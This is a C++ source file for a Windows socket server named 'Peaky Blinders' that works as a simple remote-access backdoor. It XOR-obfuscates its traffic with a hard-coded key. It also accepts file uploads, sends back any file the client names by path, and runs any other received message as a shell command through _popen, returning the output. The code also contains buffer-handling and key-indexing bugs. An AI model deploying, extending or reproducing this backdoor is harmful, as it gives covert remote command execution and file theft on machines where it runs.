// Peaky_Blinders_Sever.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>

#pragma comment(lib, "WS2_32.lib")

class Socks {
protected:
	WSADATA wsaData;
	SOCKET ListenSocket;
	SOCKET ClientSocket;

public:
	Socks();
	~Socks();
	void resolve(addrinfo **info);
	void createNbind(addrinfo **info);
	void startlistening();
	void accept_connections();
	void endclient();
	int send_msg(std::string msg);
	int receive();
	int operations(std::string msg);
	std::string encryptor(std::string msg);
	std::string recvfile();
	int sendfile(std::string directory);
};

Socks::Socks() {
	int iResult = 0; //initialization result
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf_s("Socket Initialization: %d\n", iResult);
		//system("pause");
		WSACleanup();
		exit(1);
	}
}

Socks::~Socks() {
	WSACleanup();
}

//resolves address and port
void Socks::resolve(addrinfo **info) {
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int result = getaddrinfo("localhost", "80", &hints, info);
	if (result != 0) {
		printf("getaddrinfo failed with error: %d\n", result);
		WSACleanup();
		exit(2);
	}
}

//create a SOCKET for server and bind it
void Socks::createNbind(addrinfo **info) {
	ListenSocket = INVALID_SOCKET;
	addrinfo *result = *info;
	ListenSocket = socket(result->ai_family,
		result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(3);
	}

	int res = 0;
	res = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (res == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(4);
	}
}

//listen on server
void Socks::startlistening() {
	int result = listen(ListenSocket, SOMAXCONN);
	if (result == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(5);
	}
}

//accept connections on server
void Socks::accept_connections() {
	ClientSocket = INVALID_SOCKET;
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(6);
	}
}

//close socket
void Socks::endclient() {
	closesocket(ClientSocket);
	WSACleanup();
}

//send a message to the client
int Socks::send_msg(std::string msg) {
	int result = 0;
	//send message length
	int msg_len = msg.length();
	std::stringstream out;
	out << msg_len;
	std::string msg_as_len = out.str();
	result = send(ClientSocket, msg_as_len.c_str(), msg_as_len.length(), 0);
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 7;
	}

	msg = encryptor(msg);
	result = send(ClientSocket, msg.c_str(), msg.length(), 0);
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 7;
	}

	return 0;
}

//encrypt or decrypt message
std::string Socks::encryptor(std::string msg) {
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();
	int msg_len = msg.length();
	for (int i =0,x = 0; i < msg_len; i++, x++) {
		if (x > peaky_len) {
			x = 0;
		}
		msg[i] = msg[i] ^ peaky[x];
	}

	return msg;
}

//receive message from client
int Socks::receive() {
	int result = 0;
	char recvbuf[20];
	result = recv(ClientSocket, recvbuf, 20, 0);
	
	if (result > 0) {
		std::string msg = recvbuf;

		//parse actual data from message
		for (int i = 0; i < 20; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}
		int msg_len = atoi(msg.c_str());

		int number_of_bytes = 0;
		msg = "";
		while (number_of_bytes < msg_len) {
			result = recv(ClientSocket, recvbuf, 20, 0);
			if (result > 0) {
				for (int i = 0; i < 20; i++) {
					msg = msg + recvbuf[i];
				}
				number_of_bytes += 20;
			}
			else
				break;
		}
		if (result > 0) {
			std::string encrypted_str = "";
			for (int i = 0; i < msg_len; i++) {
				encrypted_str += msg[i];
			}
			encrypted_str = encryptor(encrypted_str);
			printf("%s", encrypted_str.c_str());
			operations(encrypted_str);
		}
	}

	return 0;
}

//receive file from client
std::string Socks::recvfile() {
	int result = 0;
	char recvbuf[20];
	result = recv(ClientSocket, recvbuf, 20, 0);

	if (result > 0) {
		std::string msg = recvbuf;

		//parse actual data from message
		for (int i = 0; i < 20; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}
		int msg_len = atoi(msg.c_str());

		int number_of_bytes = 0;
		msg = "";
		while (number_of_bytes < msg_len) {
			result = recv(ClientSocket, recvbuf, 20, 0);
			if (result > 0) {
				for (int i = 0; i < 20; i++) {
					msg = msg + recvbuf[i];
				}
				number_of_bytes += 20;
			}
			else
				break;
		}
		if (result > 0) {
			std::string encrypted_str = "";
			for (int i = 0; i < msg_len; i++) {
				encrypted_str += msg[i];
			}
			//decrypt
			encrypted_str = encryptor(encrypted_str);
			return encrypted_str;
		}
	}

	return "0";
}

//sends file
int Socks::sendfile(std::string directory) {
	//send okay
	send_msg("Ok\n");

	////////////////////////////////////
	//RECIEVE DIRECTORY FROM CLIENT
	////////////////////////////////////
	int result = 0;
	char recvbuf[20];
	std::string encrypted_str = "";
	result = recv(ClientSocket, recvbuf, 20, 0);
	
	if (result > 0) {
		std::string msg = recvbuf;

		//parse actual data from message
		for (int i = 0; i < 20; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}
		int msg_len = atoi(msg.c_str());

		int number_of_bytes = 0;
		msg = "";
		while (number_of_bytes < msg_len) {
			result = recv(ClientSocket, recvbuf, 20, 0);
			if (result > 0) {
				for (int i = 0; i < 20; i++) {
					msg = msg + recvbuf[i];
				}
				number_of_bytes += 20;
			}
			else
				break;
		}
		if (result > 0) {
			for (int i = 0; i < msg_len; i++) {
				encrypted_str += msg[i];
			}
			encrypted_str = encryptor(encrypted_str);
		}
		printf("%s", encrypted_str.c_str());
	}
	////////////////////////////////////
	//Start sending file data to client
	////////////////////////////////////
	directory = encrypted_str;

	std::fstream myfile(directory.c_str(), std::fstream::in);
	myfile.seekg(0, myfile.end);
	unsigned int filesize = myfile.tellg();
	char *fileBuf = new char[filesize];
	myfile.seekg(0, std::fstream::beg);
	myfile.read(fileBuf, filesize);
	myfile.close();

	send_msg(fileBuf);

	return 0;
}

//responsible for networking operations
int Socks::operations(std::string msg) {
	//check
	std::string type = "";
	if (msg.length() > 11)
		type = msg.substr(0, 11);

	if (type == "CLIENT_INFO") {
		std::ofstream myfile;
		myfile.open("log.txt");
		myfile << msg;
		myfile.close();
		int res=send_msg("Ok");
		if (res != 0) {
			return 1;
		}
	}
	else if (msg == "exit") {
		int res=send_msg("exit");
		if (res != 0) {
			return 1;
		}
	}
	else if (msg == "upload") {
		send_msg("Ok\n");
		//receive file name
		msg = recvfile();
		if (msg != "0") {
			send_msg("Ok\n");
			//open file
			std::ofstream writeData;//Output stream to store incoming file data
			int found = 0;			//Points to the first char found
			found = msg.find_last_of("\\");//Parse the directory to get the filename 
			std::string newFile = msg.substr(found + 1, msg.length()).c_str(); // store the filename not the full path
			writeData.open(newFile);//open up a local file to write to
			//receive file data
			std::string file_msg = recvfile();
			//write file
			if (file_msg != "0") {
				if (writeData.is_open()) {
					printf("%s", file_msg.c_str());
					writeData << file_msg;
					writeData.close();
					send_msg("Ok\n");
				}
			}
			else {
				send_msg("error\n");
				printf("Error sending message\n");
			}
		}
		else
			send_msg("error\n");
	}
	else if (msg == "download") {
		sendfile("");
	}
	else if (msg == "Ok\n") {
		send_msg("Ok\n");
	}
	else{
		//need to pipe output into char array
		//take address from captured response
		char buffer[4000];
		std::string data = "";
		//runs a command 
		FILE* _pipe = _popen(msg.c_str(), "r");

		//redirects stdout to pipe and adds elements of buffer to result string
		if (!_pipe) {
			std::cout << "ERROR" << std::endl;
		}

		while (!feof(_pipe)) {
			//place characters in buffer into string
			if (fgets(buffer, 4000, _pipe) != NULL)
				data += buffer;
		}
		_pclose(_pipe);

		int res=send_msg(data);
		if (res != 0) {
			return 1;
		}
	}
	
	if (msg != "exit") {
		int res = receive();
		if (res != 0) {
			return 1;
		}
	}

	return 0;
}

int main()
{
	//variable declarations
	Socks serv_sock;
	addrinfo *info_ptr = NULL;

	//connection management
	serv_sock.resolve(&info_ptr);
	serv_sock.createNbind(&info_ptr);
	freeaddrinfo(info_ptr);
	serv_sock.startlistening();
	serv_sock.accept_connections();
	serv_sock.receive();

	int temp = 0;
	std::cin >> temp;
    return 0;
}
